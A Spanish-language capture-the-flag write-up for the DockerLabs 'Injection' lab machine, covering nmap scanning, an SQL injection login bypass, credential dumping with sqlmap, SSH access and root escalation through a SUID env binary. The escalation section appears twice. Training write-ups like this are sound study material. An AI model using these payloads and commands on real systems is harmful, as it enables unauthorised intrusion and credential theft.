# INJECTION
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.17.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Sep  7 17:07:25 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Sun Sep  7 17:07:26 2025 -- 1 IP address (1 host up) scanned in 1.48 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Sun Sep  7 17:14:20 2025 as: /usr/lib/nmap/nmap --privileged -p22,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
   9   │ |_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
  10   │ 80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
  11   │ | http-cookie-flags: 
  12   │ |   /: 
  13   │ |     PHPSESSID: 
  14   │ |_      httponly flag not set
  15   │ |_http-title: Iniciar Sesi\xC3\xB3n
  16   │ |_http-server-header: Apache/2.4.52 (Ubuntu)
  17   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  18   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  19   │ 
  20   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  21   │ # Nmap done at Sun Sep  7 17:14:28 2025 -- 1 IP address (1 host up) scanned in 7.72 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7) por lo que nos centraremos primero en el servicio HTTP del puerto 80.  Para ello nos dirigiremos al navegador y escribiremos la dirección IP. 

![Panel de Login](https://github.com/JavieRR13/WriteUps/blob/9b5fe63cc7ac5bb28d3908e2bde8db8f0f18ac69/DockerLabs/Injection/Im%C3%A1genes/Injection_PanelLogin.png)

Tras acceder a la web nos encontramos con un panel de login en el cual probaremos a usar el clásico user: admin/password: admin que, como era lógico, no iba a funcionar. Ahora tenemos dos opciones:
1. Probar con una inyección SQL.
2. Hacer uso de la herramienta SQLmap

### 1. Inyección SQL
En nuestro caso vamos a probar con "' or 1=1 --" y una contraseña aleatoria. Vemos que funciona y nos dirige a la página *172.17.0.2/acceso_valido_dylan.php* con un mensaje con lo que parece un usuario y una contraseña.
![Verificación del login](https://github.com/JavieRR13/WriteUps/blob/7822d55fd459467c092cd53b1ffe3725a01209cd/DockerLabs/Injection/Im%C3%A1genes/Injection_VerificacionLogin.png)
![Usuario y contraseña](https://github.com/JavieRR13/WriteUps/blob/489a64f2311f3532d2e8038ab675cf76a087ad30/DockerLabs/Injection/Im%C3%A1genes/Injection_Contrase%C3%B1a_Usuario.png)
¿Cómo funciona?
* Imaginemos que tenemos un formulario de inicio de sesión con un SQL no sanitizado con la consulta: ``SELECT * FROM usuarios WHERE usuario = 'INPUT' AND contraseña = 'INPUT';`` 
* El ``or 1=1`` siempre devuelve verdadero.
* El ``--`` es un comentario en SQL, que ignora el resto de la consulta (incluida la validación de contraseña).
* Por lo tanto la consulta se transforma en
```sql
SELECT * FROM usuarios WHERE usuario = '' or 1=1 --' AND contraseña = 'contraseñaRandom';
```
¿Qué pasa?
* '' es un string vacío.
* or 1=1 siempre es verdadero, así que la condición global del WHERE se cumple.
* -- convierte el resto de la línea en un comentario, por lo que la verificación de contraseña se ignora totalmente.

Con esta información vamos a intentar logaearnos en el servicio SSH y ver si conseguimos acceso a un posible usuario *Dylan*.
```ruby
❯ ssh dylan@172.17.0.2
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@127ef1d0b8b9:~$ whoami
dylan
```
Como era de esperar, estamos dentro del servicio SSH con el usuario *Dylan*.  

Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
```ruby
dylan@127ef1d0b8b9:~$ sudo -l
-bash: sudo: command not found
```
Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
* Tu usuario no tiene permisos para sudo, o sudo no está instalado.

La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
```ruby 
dylan@127ef1d0b8b9:~$ find / -type f -perm -4000 2>/dev/null 
```
* Con find buscamos archivos y directorios en Linux.
* Con / indicamos desde la raíz del sistema (es decir, busca en todo el sistema de archivos).
* Con -type filtramos el tipo de archivo que queremos encontrar.
* f significa *file* (archivo regular).
* Con -perm filtramos por permisos específicos.
* El bit 4000 corresponde al bit SUID:
  * 4000 indica “ejecutar con los permisos del propietario”.
  * El - antes de 4000 significa que cualquier archivo que tenga este bit SUID activado será incluido, aunque tenga otros permisos también.
* Con 2>/dev/null conseguimos que la salida solo muestre los archivos válidos y no los errores.
  * 2 es el descriptor de error (stderr).
  * /dev/null es un archivo especial en Linux que descarta todo lo que se escriba en él.

Una vez lo hemos ejecutado nos encontramos frente a la siguiente salida:
```ruby
dylan@127ef1d0b8b9:~$ find / -type f -perm -4000 2>/dev/null 
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/su
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
```
De todos estos archivos el más explotable es ``/usr/bin/env puesto que con env podemos ejecutar un programa con un entorno modificado.  Para encontrar alguna vulnerabilidad en este binario ejecutable podemos dirigirnos a [GTFOBins](https://gtfobins.github.io/gtfobins/env/#shell) y buscar en el binario correspondiente, en este caso *env*.
![GTFOBins](https://github.com/JavieRR13/WriteUps/blob/8db246ecc76e6e57d754306c4eec3ef6f68a4b97/DockerLabs/Muy%20f%C3%A1cil/Injection/Im%C3%A1genes/GTOBins_env.png)

En nuestro caso nos interesa el apartado de SUID, por lo que nos dirigiremos a la terminal y probaremos el comando aportado.
```ruby
dylan@127ef1d0b8b9:~$ /usr/bin/env /bin/sh -p
# whoami
root
```
🥳CONSEGUIDO, SOMOS ROOT🥳
____________________________________________________________________________________________
### 2. SQLmap
Primero debemos rellenar el cuestionario con datos aleatorios, esto actualizará la url de la página en el navegador y nos añadirá el subdominio *172.17.0.2/index.php*. Ahora, una vez que sabemos como se llama la página del formulario, nos dirigiremos a la terminal y con la herramienta [SQLmap](https://github.com/sqlmapproject/sqlmap) buscaremos todas las bases de datos que se encuentren en este sistema.

```bash
> sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
[20:07:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:07:01] [INFO] fetching database names
[20:07:01] [INFO] retrieved: 'information_schema'
[20:07:01] [INFO] retrieved: 'register'
[20:07:01] [INFO] retrieved: 'sys'
[20:07:01] [INFO] retrieved: 'mysql'
[20:07:01] [INFO] retrieved: 'performance_schema'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] register
[*] sys

[20:07:01] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0805pm.csv'

[*] ending @ 20:07:01 /2025-09-07/
```   
* Con -u indicamos la url.
* --forms le dice a sqlmap que busque formularios en la página (inputs, login forms, búsqueda, etc.) y trate de inyectar SQL allí.
* Con --dbs indicamos que queremos listar las bases de datos disponibles si encuentra una inyección exitosa.
* Con --batch indicamos a sqlmap que no nos pregunte  durante el ataque, sino que asuma respuestas por defecto. Es útil para automatizar el proceso en scripts o pruebas largas.

Bien, hemos encontrado la base de datos *register* así que accedemos a ella y listamos las tablas que pueda haber.

```bash
> sqlmap -u http://172.17.0.2 --forms -D register --tables --batch
[20:15:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:15:29] [INFO] fetching tables for database: 'register'
[20:15:29] [INFO] retrieved: 'users'
Database: register
[1 table]
+-------+
| users |
+-------+

[20:15:29] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0815pm.csv'

[*] ending @ 20:15:29 /2025-09-07/
```
Esto nos ha indicado que en esta base de datos hay una tabla que se llama *users*, la cual, sospechosamente, puede contener usuarios.  Ahora que ya tenemos la tabla, lo que nos interesa es conseguir las columnas, así que ejecutamos:
```bash
> sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch
[20:20:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:20:43] [INFO] fetching columns for table 'users' in database 'register'
[20:20:43] [INFO] retrieved: 'username'
[20:20:43] [INFO] retrieved: 'varchar(30)'
[20:20:43] [INFO] retrieved: 'passwd'
[20:20:43] [INFO] retrieved: 'varchar(30)'
Database: register
Table: users
[2 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| passwd   | varchar(30) |
| username | varchar(30) |
+----------+-------------+

[20:20:43] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0820pm.csv'

[*] ending @ 20:20:43 /2025-09-07/
```
Ya por último sería acceder a los datos de las dos columnas que hemos encontrado así que ejecutamos: 
```bash
> sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch
[20:22:38] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[20:22:38] [INFO] fetching entries of column(s) 'passwd,username' for table 'users' in database 'register'
[20:22:38] [INFO] retrieved: 'KJSDFG789FGSDF78'
[20:22:38] [INFO] retrieved: 'dylan'
Database: register
Table: users
[1 entry]
+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+

[20:22:38] [INFO] table 'register.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
[20:22:38] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-09072025_0822pm.csv'

[*] ending @ 20:22:38 /2025-09-07/
```
* Con --dump volcamos la información de las columnas que acabamos de inyectar.

Vemos que nos ha devuelto un usuario *dylan* y una contraseña *KJSDFG789FGSDF78* así que lo probaremos en el formulario web a ver que sucede.  En este caso nos devuelve a la misma página de *http://172.17.0.2/acceso_valido_dylan.php* que hemos visto en la primera forma de resolver esta máquina así que, a partir de aquí el resto de la máquina será igual.

(------------------------------------A PARTIR DE AQUÍ, LA FORMA DE ESCALAR PRIVILEGIOS SERÁ LA MISMA------------------------------------)

Con esta información vamos a intentar logaearnos en el servicio SSH y ver si conseguimos acceso a un posible usuario *Dylan*.
```ruby
❯ ssh dylan@172.17.0.2
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@127ef1d0b8b9:~$ whoami
dylan
```
Como era de esperar, estamos dentro del servicio SSH con el usuario *Dylan*.  

Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
```ruby
dylan@127ef1d0b8b9:~$ sudo -l
-bash: sudo: command not found
```
Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
* Tu usuario no tiene permisos para sudo, o sudo no está instalado.

La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 
```ruby 
dylan@127ef1d0b8b9:~$ find / -type f -perm -4000 2>/dev/null 
```
* Con find buscamos archivos y directorios en Linux.
* Con / indicamos desde la raíz del sistema (es decir, busca en todo el sistema de archivos).
* Con -type filtramos el tipo de archivo que queremos encontrar.
* f significa *file* (archivo regular).
* Con -perm filtramos por permisos específicos.
* El bit 4000 corresponde al bit SUID:
  * 4000 indica “ejecutar con los permisos del propietario”.
  * El - antes de 4000 significa que cualquier archivo que tenga este bit SUID activado será incluido, aunque tenga otros permisos también.
* Con 2>/dev/null conseguimos que la salida solo muestre los archivos válidos y no los errores.
  * 2 es el descriptor de error (stderr).
  * /dev/null es un archivo especial en Linux que descarta todo lo que se escriba en él.

Una vez lo hemos ejecutado nos encontramos frente a la siguiente salida:
```ruby
dylan@127ef1d0b8b9:~$ find / -type f -perm -4000 2>/dev/null 
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/su
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/passwd
```
De todos estos archivos el más explotable es ``/usr/bin/env puesto que con env podemos ejecutar un programa con un entorno modificado.  Para encontrar alguna vulnerabilidad en este binario ejecutable podemos dirigirnos a [GTFOBins](https://gtfobins.github.io/gtfobins/env/#shell) y buscar en el binario correspondiente, en este caso *env*.
![GTFOBins](https://github.com/JavieRR13/WriteUps/blob/8db246ecc76e6e57d754306c4eec3ef6f68a4b97/DockerLabs/Muy%20f%C3%A1cil/Injection/Im%C3%A1genes/GTOBins_env.png)

En nuestro caso nos interesa el apartado de SUID, por lo que nos dirigiremos a la terminal y probaremos el comando aportado.
```ruby
dylan@127ef1d0b8b9:~$ /usr/bin/env /bin/sh -p
# whoami
root
```
🥳CONSEGUIDO, SOMOS ROOT🥳
